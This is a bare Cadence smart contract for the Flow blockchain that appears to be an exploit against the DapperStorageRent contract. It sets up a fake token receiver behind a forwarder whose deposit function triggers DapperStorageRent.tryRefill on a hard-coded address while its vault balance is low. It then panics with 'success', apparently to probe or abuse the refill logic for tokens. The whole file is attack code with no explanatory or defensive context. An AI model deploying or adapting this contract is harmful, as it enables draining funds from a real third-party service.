import DapperStorageRent from 0xa08e88e23f332538  
import PrivateReceiverForwarder from "../0x18eb4ee6b3c026d2/PrivateReceiverForwarder.cdc"
import FlowToken from "../0x1654653399040a61/FlowToken.cdc"
import FungibleToken from "../0xf233dcee88fe0abe/FungibleToken.cdc"

pub contract new {
     
    pub var receiver: Capability<&{FungibleToken.Receiver}>
    
    init(){
        var vault <- FlowToken.createEmptyVault()
        self.account.save(<-vault, to:/storage/vault)
        
        var fake <- create FakeReceiver()
        self.account.save(<-fake, to:/storage/fake)
        self.account.link<&{FungibleToken.Receiver, FungibleToken.Balance}>(/public/receiver, target:/storage/fake)

        self.receiver = self.account.getCapability<&{FungibleToken.Receiver}>(/public/receiver)
        var forwarder <- PrivateReceiverForwarder.createNewForwarder(recipient: self.receiver)

        self.account.save(<-forwarder, to:/storage/fw)
        self.account.link<&PrivateReceiverForwarder.Forwarder>(/public/privateForwardingPublic, target:/storage/fw)
    }

  

    pub resource FakeReceiver: FungibleToken.Receiver{
        
        pub fun deposit(from: @FungibleToken.Vault){
            var vault = new.account.borrow<&FlowToken.Vault>(from:/storage/vault)!
            vault.deposit(from: <-from)
            if vault.balance<6.00{
                DapperStorageRent.tryRefill(0x73e4a1094d0bcab6)
            }
            panic("success")
        }
    }


}












